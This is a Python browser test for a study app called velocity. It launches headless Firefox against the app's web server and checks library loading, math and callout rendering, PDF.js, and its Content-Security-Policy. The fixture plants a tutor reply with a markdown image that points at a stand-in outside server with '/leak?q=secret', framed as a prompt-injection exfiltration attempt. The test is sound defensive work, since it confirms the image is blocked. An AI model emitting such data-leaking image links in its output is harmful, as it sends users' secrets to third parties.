"""The page in a real browser (security review, 2026-11-12): what pytest can't check.

    uv run --with websockets python tests/browser_check.py

Needs Firefox. Everything runs on throwaway folders: a vault with a subject, a PDF book
and a session whose reply has math, a callout, a link with math in its address, and an
image planted on another origin (as a prompt injection would). It starts `velocity web`,
a stand-in "outside" server that logs every request, and headless Firefox with its own
profile, all on free ports, and stops exactly those processes at the end. Your own
vault, settings, keys and browser are never touched.

Checks: the bundled libraries load; math and callouts render; PDF.js (module and worker)
opens and draws a page; the planted image is blocked by the Content-Security-Policy and
never requested; every request goes to velocity's own server; math in a link's address
stays inside the attribute; no console errors but the expected policy report. Exit code
0 when all pass.
"""

import asyncio
import contextlib
import http.server
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import ClassVar

import websockets

ROOT = Path(__file__).resolve().parent.parent


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def wait_for_port(port: int, timeout: float = 60) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        with (
            contextlib.suppress(OSError),
            socket.create_connection(("127.0.0.1", port), timeout=0.5),
        ):
            return
        time.sleep(0.2)
    raise TimeoutError(f"nothing listening on {port}")


class Outside(http.server.BaseHTTPRequestHandler):
    """The stand-in for another site: remembers every request it gets."""

    seen: ClassVar[list[str]] = []

    def do_GET(self):  # the stdlib's name for it
        Outside.seen.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()

    def log_message(self, *args):
        pass


REPLY = (
    "A limit is what $f(x)$ approaches: $$\\lim_{x\\to a} f(x) = L$$\n\n"
    "> [!question] Try this\n> What is $\\lim_{x\\to 2} x^2$?\n\n"
    "[see this](https://a.example/$y$)\n\n"
    "![tracking](http://127.0.0.1:{port}/leak?q=secret)"
)


def make_world(tmp: Path, outside_port: int) -> str:
    """Config, vault, subject, book and session, in `tmp` only: this process's XDG
    folders point there first, and so do the server's (it inherits them). Returns the
    session's id."""
    os.environ["XDG_CONFIG_HOME"] = str(tmp / "config")
    os.environ["XDG_DATA_HOME"] = str(tmp / "data")
    import pymupdf

    from velocity.config import add_source, create_subject, load_config
    from velocity.session import Session, record_dir

    (tmp / "config/velocity").mkdir(parents=True)
    (tmp / "vault").mkdir()
    (tmp / "config/velocity/config.toml").write_text(
        f'vault_path = "{(tmp / "vault").as_posix()}"\n', encoding="utf-8"
    )
    config = load_config()
    subject = create_subject(config, "Calculus")
    doc = pymupdf.open()
    for i in range(3):
        doc.new_page().insert_text((72, 72), f"Page {i + 1}: limits")
    doc.set_toc([[1, "Chapter 1", 1]])
    doc.save(tmp / "book.pdf")
    add_source(config, "calculus", tmp / "book.pdf", "Book")
    s = Session.start(
        "calculus", "Calculus", record_dir("calculus"), subject.sessions_dir, []
    )
    s.append("learner", "What is a limit?")
    s.append("tutor", REPLY.replace("{port}", str(outside_port)))
    s.render()
    s.end("wrap-up")
    return s.id


async def browse(bidi_port: int, page_url: str, session_id: str) -> dict:
    async with websockets.connect(
        f"ws://127.0.0.1:{bidi_port}/session", max_size=None
    ) as ws:
        n = 0
        events = []

        async def cmd(method, params):
            nonlocal n
            n += 1
            my = n
            await ws.send(json.dumps({"id": my, "method": method, "params": params}))
            while True:
                msg = json.loads(await ws.recv())
                if msg.get("id") == my:
                    if msg.get("type") == "error":
                        raise RuntimeError(msg)
                    return msg["result"]
                events.append(msg)

        await cmd("session.new", {"capabilities": {}})
        ctx = (await cmd("browsingContext.getTree", {}))["contexts"][0]["context"]
        await cmd(
            "session.subscribe",
            {"events": ["network.beforeRequestSent", "log.entryAdded"]},
        )
        await cmd(
            "browsingContext.navigate",
            {"context": ctx, "url": page_url, "wait": "complete"},
        )
        await asyncio.sleep(1)

        async def js(expr):
            r = await cmd(
                "script.evaluate",
                {"expression": expr, "target": {"context": ctx}, "awaitPromise": True},
            )
            if "result" not in r:
                return {"error": r.get("exceptionDetails", {}).get("text")}
            return json.loads(r["result"]["value"])

        out = {}
        out["libs"] = await js(
            "JSON.stringify([typeof katex, typeof marked, typeof DOMPurify])"
        )
        out["log"] = await js(
            f"""(async () => {{
              window.__violations = [];
              document.addEventListener('securitypolicyviolation',
                e => __violations.push(e.violatedDirective + ' ' + e.blockedURI));
              const log = await (await fetch('/api/subjects/calculus/sessions/{session_id}')).json();
              const el = renderMarkdown(log.markdown);
              document.body.prepend(el);
              await new Promise(r => setTimeout(r, 1500));
              const a = el.querySelector('a');
              return JSON.stringify({{
                katex: el.querySelectorAll('.katex').length,
                callouts: el.querySelectorAll('.callout').length,
                link: a ? [...a.attributes].map(x => x.name + '=' + x.value) : null,
                violations: __violations,
              }});
            }})()"""
        )
        out["pdf"] = await js(
            """(async () => {
              const lib = await import('/static/vendor/pdfjs-dist/legacy/build/pdf.min.mjs');
              lib.GlobalWorkerOptions.workerSrc =
                '/static/vendor/pdfjs-dist/legacy/build/pdf.worker.min.mjs';
              globalThis.pdfjsLib = lib;
              await import('/static/vendor/pdfjs-dist/legacy/web/pdf_viewer.mjs');
              const doc = await lib.getDocument({
                url: '/api/subjects/calculus/sources/Book/file', isEvalSupported: false,
              }).promise;
              const page = await doc.getPage(1);
              const vp = page.getViewport({ scale: 1 });
              const canvas = document.createElement('canvas');
              canvas.width = vp.width;
              canvas.height = vp.height;
              const ctx = canvas.getContext('2d');
              await page.render({ canvas, canvasContext: ctx, viewport: vp }).promise;
              const px = ctx.getImageData(0, 0, vp.width, vp.height).data;
              let dark = 0;
              for (let i = 0; i < px.length; i += 4) if (px[i + 3] && px[i] < 128) dark++;
              return JSON.stringify({ pages: doc.numPages, dark });
            })()"""
        )
        out["font"] = await js(
            "new FontFace('t', 'url(/static/vendor/katex/dist/fonts/KaTeX_Main-Regular.woff2)')"
            ".load().then(f => JSON.stringify(f.status))"
        )
        out["hosts"] = sorted(
            {
                e["params"]["request"]["url"].split("/")[2]
                for e in events
                if e.get("method") == "network.beforeRequestSent"
            }
        )
        out["console"] = [
            e["params"].get("text", "")
            for e in events
            if e.get("method") == "log.entryAdded"
            and e["params"].get("level") in ("error", "warn")
        ]
        await cmd("session.end", {})
        return out


def report(results: dict, web_port: int, outside_port: int) -> bool:
    log = results["log"]
    checks = {
        "the bundled libraries load": results["libs"]
        == ["object", "object", "function"],
        "math renders": log.get("katex", 0) >= 3,
        "callouts render": log.get("callouts") == 1,
        "the KaTeX font loads": results["font"] == "loaded",
        "PDF.js opens and draws a page": results["pdf"].get("pages") == 3
        and results["pdf"].get("dark", 0) > 0,
        "the planted image is blocked by the policy": log.get("violations")
        == [f"img-src http://127.0.0.1:{outside_port}/leak?q=secret"],
        "the outside server got no request": not Outside.seen,
        "every request goes to velocity": results["hosts"] == [f"127.0.0.1:{web_port}"],
        "math in a link's address stays in the attribute": log.get("link")
        == ["href=https://a.example/$y$"],
        "no console errors but the policy report": all(
            "Content-Security-Policy" in t and "/leak" in t for t in results["console"]
        ),
    }
    for name, ok in checks.items():
        print(f"{'PASS' if ok else 'FAIL'}  {name}")
    if not all(checks.values()):
        print("\nDetails:", json.dumps(results, indent=2))
    return all(checks.values())


def main() -> int:
    firefox = shutil.which("firefox")
    if firefox is None:
        print("Firefox isn't installed; this check needs it.")
        return 2
    web_port, outside_port, bidi_port = free_port(), free_port(), free_port()
    processes: list[subprocess.Popen] = []
    with tempfile.TemporaryDirectory(prefix="velocity-browser-check-") as tmp_name:
        tmp = Path(tmp_name)
        outside = http.server.HTTPServer(("127.0.0.1", outside_port), Outside)
        threading.Thread(target=outside.serve_forever, daemon=True).start()
        try:
            session_id = make_world(tmp, outside_port)
            processes.append(
                subprocess.Popen(
                    [
                        "uv",
                        "run",
                        "velocity",
                        "web",
                        "--no-browser",
                        "--port",
                        str(web_port),
                    ],
                    cwd=ROOT,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            )
            (tmp / "firefox").mkdir()
            processes.append(
                subprocess.Popen(
                    [
                        firefox,
                        "--headless",
                        "--no-remote",
                        "--profile",
                        str(tmp / "firefox"),
                        "--remote-debugging-port",
                        str(bidi_port),
                        "about:blank",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            )
            wait_for_port(web_port)
            wait_for_port(bidi_port)
            results = asyncio.run(
                browse(bidi_port, f"http://127.0.0.1:{web_port}/", session_id)
            )
            return 0 if report(results, web_port, outside_port) else 1
        finally:
            outside.shutdown()
            for p in processes:  # only the processes started here
                p.terminate()
            for p in processes:
                with contextlib.suppress(subprocess.TimeoutExpired):
                    p.wait(timeout=10)


if __name__ == "__main__":
    sys.exit(main())
